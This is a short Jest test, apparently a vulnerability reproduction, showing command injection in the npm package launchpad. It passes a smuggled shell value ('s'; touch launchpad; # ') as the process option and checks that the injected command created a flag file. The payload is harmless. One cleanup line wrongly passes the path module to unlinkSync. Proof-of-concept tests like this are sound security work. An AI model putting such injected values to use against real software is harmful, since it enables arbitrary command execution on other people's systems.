//https://github.com/bitovi/launchpad/pull/124
test("Command Injection in launchpad", (done) => {
  const path = require("path");
  const fs = require("fs");
  const launchpad = require(path.resolve(
    __dirname,
    "./node_modules/launchpad/lib/local/instance"
  ));
  const pathToFlag = path.resolve(__dirname, "./launchpad");
  let file_exist = fs.existsSync(pathToFlag);
  expect(file_exist).toBe(false);
  let tst = new launchpad.Instance(
    "echo",
    {},
    {},
    { process: "s'; touch launchpad; # " }
  );
  tst.getPid(() => {
    try {
      fs.unlinkSync(path);
      console.log("File removed:", path);
    } catch (err) {
      console.error(err);
    }
    file_exist = fs.existsSync(pathToFlag);
    expect(file_exist).toBe(true);
    fs.unlink(pathToFlag, function () {
      done();
    });
  });
});
